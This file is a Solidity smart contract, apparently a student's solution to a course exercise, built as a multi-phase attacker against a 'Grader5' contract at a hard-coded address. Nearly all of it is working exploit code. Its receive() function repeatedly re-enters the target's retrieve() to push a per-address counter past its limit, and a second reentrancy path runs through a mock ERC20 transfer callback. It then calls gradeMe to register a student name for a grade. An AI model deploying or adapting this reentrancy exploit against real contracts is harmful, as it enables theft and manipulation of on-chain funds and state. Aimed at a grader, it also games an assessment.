// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import "./MockERC20.sol";

/**
 * @title AdvancedGrader5Attacker - Multi-Vector Attack Contract
 * @author Eduardo J. Moreno
 * @notice Advanced attacker contract using multiple vulnerability vectors
 * @dev This contract demonstrates complex reentrancy attacks and state manipulation
 * 
 * ADVANCED ATTACK ANALYSIS:
 * This contract explores multiple attack vectors:
 * 1. Classic reentrancy via receive() function
 * 2. Cross-contract reentrancy using ERC20 callbacks  
 * 3. State manipulation through multiple entry points
 * 4. Gas optimization for complex attacks
 * 5. Multi-step attack coordination
 */
contract AdvancedGrader5Attacker {
    
    /// @notice Target contract address
    address public constant TARGET_CONTRACT = 0x5733eE985e22eFF46F595376d79e31413b1A1e16;
    
    /// @notice Contract owner
    address public immutable owner;
    
    /// @notice Mock ERC20 token for complex attacks
    MockERC20 public immutable mockToken;
    
    /// @notice Attack state variables
    struct AttackState {
        bool isActive;
        uint256 currentPhase;
        uint256 reentryCount;
        uint256 gasUsed;
        bool tokenAttackEnabled;
    }
    
    AttackState public attackState;
    
    /// @notice Attack phases
    enum Phase {
        PREPARATION,
        REENTRANCY_ATTACK,
        TOKEN_MANIPULATION, 
        STATE_VALIDATION,
        REGISTRATION,
        COMPLETED
    }
    
    /// @notice Maximum reentrancy attempts
    uint256 private constant MAX_REENTRANCY = 5;
    
    /**
     * @notice Events for attack tracking
     */
    event AttackPhaseChanged(Phase indexed newPhase, uint256 timestamp);
    event ReentrancyAttempt(uint256 indexed count, uint256 gasRemaining);
    event TokenAttackExecuted(address indexed token, bool success);
    event StateValidation(uint256 counterValue, bool isGraded);
    event AttackCompleted(bool success, string studentName, uint256 grade);

    /**
     * @notice Custom errors
     */
    error OnlyOwner();
    error AttackInProgress();
    error InvalidPhase();
    error ReentrancyLimitReached();

    /**
     * @notice Contract constructor
     * @dev Deploys MockERC20 and sets up attack infrastructure
     */
    constructor() {
        owner = msg.sender;
        
        // Deploy mock token for advanced attack scenarios
        mockToken = new MockERC20(1000000); // 1M tokens
        
        attackState = AttackState({
            isActive: false,
            currentPhase: uint256(Phase.PREPARATION),
            reentryCount: 0,
            gasUsed: 0,
            tokenAttackEnabled: false
        });
    }

    /**
     * @notice Modifier for owner-only functions
     */
    modifier onlyOwner() {
        if (msg.sender != owner) revert OnlyOwner();
        _;
    }

    /**
     * @notice Modifier to prevent overlapping attacks
     */
    modifier whenNotAttacking() {
        if (attackState.isActive) revert AttackInProgress();
        _;
    }

    /**
     * @notice Execute comprehensive multi-vector attack
     * @param studentName Name to register after successful attack
     * @param enableTokenAttack Whether to use token-based reentrancy
     * @dev Orchestrates complete attack sequence
     */
    function executeAdvancedAttack(
        string calldata studentName, 
        bool enableTokenAttack
    ) external payable onlyOwner whenNotAttacking {
        require(msg.value >= 0.001 ether, "Insufficient attack funds");
        
        // Initialize attack state
        attackState.isActive = true;
        attackState.tokenAttackEnabled = enableTokenAttack;
        attackState.gasUsed = gasleft();
        
        emit AttackPhaseChanged(Phase.PREPARATION, block.timestamp);
        
        // Phase 1: Preparation
        _prepareAttack();
        
        // Phase 2: Execute reentrancy attack  
        _executeReentrancyAttack();
        
        // Phase 3: Token manipulation (if enabled)
        if (enableTokenAttack) {
            _executeTokenAttack();
        }
        
        // Phase 4: Validate state
        _validateAttackState();
        
        // Phase 5: Register student name
        _registerStudent(studentName);
        
        // Phase 6: Complete attack
        _completeAttack();
    }

    /**
     * @notice Phase 1: Prepare attack infrastructure
     * @dev Sets up initial conditions for attack
     */
    function _prepareAttack() internal {
        _changePhase(Phase.PREPARATION);
        
        // Prepare token attack if enabled
        if (attackState.tokenAttackEnabled) {
            // Mint tokens to this contract for manipulation
            mockToken.mint(address(this), 1000 * 10**18);
        }
        
        // Reset counters
        attackState.reentryCount = 0;
    }

    /**
     * @notice Phase 2: Execute main reentrancy attack
     * @dev Primary attack vector against Grader5.retrieve()
     */
    function _executeReentrancyAttack() internal {
        _changePhase(Phase.REENTRANCY_ATTACK);
        
        // Execute primary reentrancy attack
        (bool success,) = TARGET_CONTRACT.call{value: msg.value}(
            abi.encodeWithSignature("retrieve()")
        );
        
        require(success, "Primary reentrancy attack failed");
    }

    /**
     * @notice Phase 3: Execute token-based attack  
     * @dev Secondary attack using token callbacks
     */
    function _executeTokenAttack() internal {
        _changePhase(Phase.TOKEN_MANIPULATION);
        
        try this.triggerTokenCallback() {
            emit TokenAttackExecuted(address(mockToken), true);
        } catch {
            emit TokenAttackExecuted(address(mockToken), false);
        }
    }

    /**
     * @notice Trigger token callback for additional reentrancy
     * @dev Uses token transfer to create additional attack vector
     */
    function triggerTokenCallback() external {
        require(msg.sender == address(this), "Internal call only");
        
        if (attackState.tokenAttackEnabled && attackState.reentryCount < MAX_REENTRANCY) {
            // Use token transfer to trigger callback reentrancy
            mockToken.transfer(address(this), 1);
        }
    }

    /**
     * @notice Token callback handler
     * @param from Token sender
     * @param to Token recipient  
     * @param amount Token amount
     * @dev Called by MockERC20 during transfer - reentrancy point
     */
    function onTokenReceived(address from, address to, uint256 amount) external {
        // Only respond to our mock token
        if (msg.sender != address(mockToken)) return;
        
        // Perform additional reentrancy attack if conditions are met
        if (attackState.isActive && 
            attackState.currentPhase == uint256(Phase.TOKEN_MANIPULATION) &&
            attackState.reentryCount < MAX_REENTRANCY) {
            
            attackState.reentryCount++;
            emit ReentrancyAttempt(attackState.reentryCount, gasleft());
            
            // Additional call to target contract
            (bool success,) = TARGET_CONTRACT.call{value: 4 wei}(
                abi.encodeWithSignature("retrieve()")
            );
            
            // Continue even if this attack fails
        }
    }

    /**
     * @notice Phase 4: Validate attack state
     * @dev Verify that attack achieved desired state changes
     */
    function _validateAttackState() internal {
        _changePhase(Phase.STATE_VALIDATION);
        
        // Check counter value
        (bool success, bytes memory data) = TARGET_CONTRACT.staticcall(
            abi.encodeWithSignature("counter(address)", address(this))
        );
        
        uint256 counterValue = 0;
        if (success && data.length >= 32) {
            counterValue = abi.decode(data, (uint256));
        }
        
        // Check if already graded
        (bool success2, bytes memory data2) = TARGET_CONTRACT.staticcall(
            abi.encodeWithSignature("isGraded(address)", address(this))
        );
        
        bool isGraded = false;
        if (success2 && data2.length >= 32) {
            isGraded = abi.decode(data2, (bool));
        }
        
        emit StateValidation(counterValue, isGraded);
        
        // Verify attack was successful
        require(counterValue > 1, "Attack failed: counter not manipulated");
        require(!isGraded, "Attack failed: already graded");
    }

    /**
     * @notice Phase 5: Register student name
     * @param studentName Name to register
     * @dev Final step to register in grading system
     */
    function _registerStudent(string calldata studentName) internal {
        _changePhase(Phase.REGISTRATION);
        
        (bool success, bytes memory data) = TARGET_CONTRACT.call(
            abi.encodeWithSignature("gradeMe(string)", studentName)
        );
        
        if (!success) {
            // Decode error if possible
            if (data.length > 0) {
                assembly {
                    let returndata_size := mload(data)
                    revert(add(32, data), returndata_size)
                }
            } else {
                revert("Registration failed");
            }
        }
        
        // Get the achieved grade
        uint256 grade = _getStudentGrade(studentName);
        emit AttackCompleted(true, studentName, grade);
    }

    /**
     * @notice Phase 6: Complete attack sequence
     * @dev Clean up attack state
     */
    function _completeAttack() internal {
        _changePhase(Phase.COMPLETED);
        attackState.isActive = false;
        attackState.gasUsed = attackState.gasUsed - gasleft();
    }

    /**
     * @notice Change attack phase and emit event
     * @param newPhase New phase to transition to
     */
    function _changePhase(Phase newPhase) internal {
        attackState.currentPhase = uint256(newPhase);
        emit AttackPhaseChanged(newPhase, block.timestamp);
    }

    /**
     * @notice Get student grade by name
     * @param studentName Name to check
     * @return Grade value
     */
    function _getStudentGrade(string calldata studentName) internal view returns (uint256) {
        (bool success, bytes memory data) = TARGET_CONTRACT.staticcall(
            abi.encodeWithSignature("students(string)", studentName)
        );
        
        if (success && data.length >= 32) {
            return abi.decode(data, (uint256));
        }
        return 0;
    }

    /**
     * @notice Receive function - primary reentrancy entry point
     * @dev Called by Grader5.retrieve() - main attack vector
     */
    receive() external payable {
        if (attackState.isActive && 
            attackState.currentPhase == uint256(Phase.REENTRANCY_ATTACK) &&
            attackState.reentryCount < MAX_REENTRANCY) {
            
            attackState.reentryCount++;
            emit ReentrancyAttempt(attackState.reentryCount, gasleft());
            
            // Execute reentrancy attack
            (bool success,) = TARGET_CONTRACT.call{value: 4 wei}(
                abi.encodeWithSignature("retrieve()")
            );
            
            // Continue attack even if individual calls fail
        }
    }

    /**
     * @notice Fallback function for additional attack vectors
     */
    fallback() external payable {
        // Handle unexpected calls during attack
        if (attackState.isActive && msg.value > 0) {
            // Route to receive function logic
        }
    }

    /**
     * @notice Get comprehensive attack status
     * @return isActive Whether attack is currently running
     * @return currentPhase Current phase of the attack
     * @return reentryCount Number of reentrancy attempts made
     * @return gasUsed Total gas consumed in attack
     * @return tokenAttackEnabled Whether token attack is enabled
     * @return contractBalance ETH balance of this contract
     * @return tokenBalance Token balance of this contract
     */
    function getAttackStatus() external view returns (
        bool isActive,
        uint256 currentPhase,
        uint256 reentryCount,
        uint256 gasUsed,
        bool tokenAttackEnabled,
        uint256 contractBalance,
        uint256 tokenBalance
    ) {
        return (
            attackState.isActive,
            attackState.currentPhase,
            attackState.reentryCount,
            attackState.gasUsed,
            attackState.tokenAttackEnabled,
            address(this).balance,
            mockToken.balanceOf(address(this))
        );
    }

    /**
     * @notice Emergency withdrawal function
     * @dev Allows owner to recover funds after attack
     */
    function emergencyWithdraw() external onlyOwner {
        uint256 ethBalance = address(this).balance;
        uint256 tokenBalance = mockToken.balanceOf(address(this));
        
        if (ethBalance > 0) {
            payable(owner).transfer(ethBalance);
        }
        
        if (tokenBalance > 0) {
            mockToken.transfer(owner, tokenBalance);
        }
    }

    /**
     * @notice Reset attack state for new attempts
     * @dev Allows multiple attack attempts with different parameters
     */
    function resetAttackState() external onlyOwner whenNotAttacking {
        attackState = AttackState({
            isActive: false,
            currentPhase: uint256(Phase.PREPARATION),
            reentryCount: 0,
            gasUsed: 0,
            tokenAttackEnabled: false
        });
        
        // Reset token callback counter
        mockToken.resetCallbackCount();
    }
}
